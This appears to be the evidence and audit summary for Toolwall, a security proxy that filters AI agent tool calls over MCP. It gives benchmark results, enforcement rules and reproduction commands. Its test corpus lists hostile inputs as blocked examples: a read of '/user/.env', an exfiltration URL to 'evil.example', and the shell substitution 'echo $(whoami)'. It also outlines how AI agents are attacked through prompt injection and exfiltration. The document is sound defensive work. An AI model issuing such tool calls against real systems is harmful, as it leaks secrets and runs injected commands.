# Evidence Bundle

This document is the compact audit entry point for checked-in Toolwall behavior.

Scope:

- local MCP JSON-RPC `tools/call` traffic over stdio
- HTTP gateway routing for registered tools
- fail-closed AST egress filters
- NHI authorization and tool-scope checks
- color-boundary and preflight checks for high-trust tools
- SQLite-backed cache and security event history
- structured audit events for blocked requests
- bounded rate-limit, sanitizer, audit-log, and stdio request state

Non-goal:

- this file does not claim prevention of every prompt-injection class
- this file only summarizes behavior covered by the checked-in corpus, tests, and benchmark output

## Current benchmark result

Latest repo-local benchmark artifact:

```text
npm run benchmark:stdio -- --json --output evidence.json
```

Observed result in the checked-out repository:

| Metric | Value |
|---|---:|
| Corpus cases | 19 |
| Requests | 24 |
| Allowed requests | 10 |
| Blocked requests | 14 |
| Cache hits | 5 |
| Cache consistency failures | 0 |
| False positives | 0 |
| False negatives | 0 |
| Verdict | `passed` |

## Corpus examples

The source corpus is `examples/evidence-corpus.json`.

| Corpus case | Tool | Input pattern | Expected code |
|---|---|---|---|
| `block-sensitive-path-read-file` | `read_file` | `path: "/user/.env"` | `SENSITIVE_PATH_BLOCKED` |
| `block-shadowleak-fetch-url` | `fetch_url` | `https://evil.example/exfil?a=x&b=y&c=z` | `SHADOWLEAK_DETECTED` |
| `block-shell-injection-execute-command` | `execute_command` | `command: "echo $(whoami)"` | `SHELL_INJECTION_BLOCKED` |

Additional blocked classes in the corpus:

- repeated short-chunk URL exfiltration: `SHADOWLEAK_DETECTED`
- instruction-override text in tool arguments: `EPISTEMIC_CONTRADICTION_DETECTED`
- missing NHI authorization: `AUTH_FAILURE`
- insufficient tool scope: `MISSING_SCOPE`
- high-trust tool without preflight: `PREFLIGHT_REQUIRED`
- mixed red/blue tool request: `CROSS_TOOL_HIJACK_ATTEMPT`

## Enforcement surfaces

### AST egress filters

AST checks run before downstream target execution. They inspect MCP tool arguments and deny requests with explicit error codes for:

- ShadowLeak-style URL exfiltration
- sensitive local paths such as `.env`, `.ssh`, and private key paths
- shell substitution or shell-control syntax in command arguments
- instruction-override or contradiction phrases in tool input

### Authorization and scope checks

When `PROXY_AUTH_TOKEN` is configured, stdio requests must include a valid `_meta.authorization` Bearer envelope.

Scope checks require the caller to hold either:

- `tools.<toolName>`
- `tools.*`

Missing or invalid authorization fails closed before target execution.

### Preflight and color boundary

High-trust tools require a valid preflight ID. This covers default high-trust tool families such as:

- `execute_command`
- `fetch_url`
- `write_file`
- `write`
- `create_file`

Mixed red/blue tool sets are denied as cross-tool boundary violations.

### Rate limiting

Rate limiting is isolated by transport, identity, target, and tool. A limit breach returns:

- HTTP `429` on HTTP/API paths
- JSON-RPC error `-32029` with `RATE_LIMIT_EXCEEDED` on stdio paths

Each breach writes a `RATE_LIMIT_EXCEEDED` audit event.

Current in-memory rate-limit state is bounded by:

- `MCP_RATE_LIMIT_MAX_KEYS`, default `10000`
- `MCP_RATE_LIMIT_MAX_KEY_LENGTH`, default `512`
- `MCP_RATE_LIMIT_CLEANUP_INTERVAL_MS`, default `60000`

### Resource limits

Current checked-in limits include:

| Limit | Default |
|---|---:|
| HTTP JSON body | `1048576` bytes |
| stdio pending requests | `1000` |
| stdio JSON line | `10485760` bytes |
| stdio serialized response | `5242880` bytes |
| HTTP target response | `5242880` bytes |
| sanitizer depth | `20` |
| sanitizer array items | `1000` |
| sanitizer object keys | `1000` |
| sanitizer regex string input | `1048576` bytes |

## Audit and persistence

Blocked requests are recorded through `auditLogger` with a concrete `code`.

Recorded security events are available through:

- in-process blocked-request metrics
- Prometheus metrics
- SQLite-backed security event history
- dashboard `securityEvents`

The Docker Compose service mounts `toolwall-data:/data`; SQLite history under `/data/.mcp-cache` survives container restarts.

Security-log rows are bounded by TTL and max-row pruning. Audit file writes are bounded by serialized entry size and backpressure handling.

## Error shape evidence

Stdio failures return JSON-RPC 2.0 errors. HTTP `/mcp` failures also return JSON-RPC 2.0 when the request body is JSON-RPC-like:

```json
{
  "jsonrpc": "2.0",
  "id": "route-miss-1",
  "error": {
    "code": -32004,
    "data": {
      "code": "UNKNOWN_ROUTE"
    }
  }
}
```

## Reproduction commands

Run the compact validation path:

```bash
npm run verify:all
```

Run only the stdio benchmark:

```bash
npm run benchmark:stdio -- --json --output evidence.json
```

Inspect current evidence:

```bash
node -e "const e=require('./evidence.json'); console.log(e.totals, e.verdict)"
```

Expected benchmark boundary:

- `falsePositives` equals `0`
- `falseNegatives` equals `0`
- `verdict` equals `passed`

## Related documents

- [Architecture](ARCHITECTURE.md)
- [Runtime Contract](RUNTIME_CONTRACT.md)
- [Risk Model](RISK_MODEL.md)
- [Limits and Non-Goals](LIMITS_AND_NON_GOALS.md)
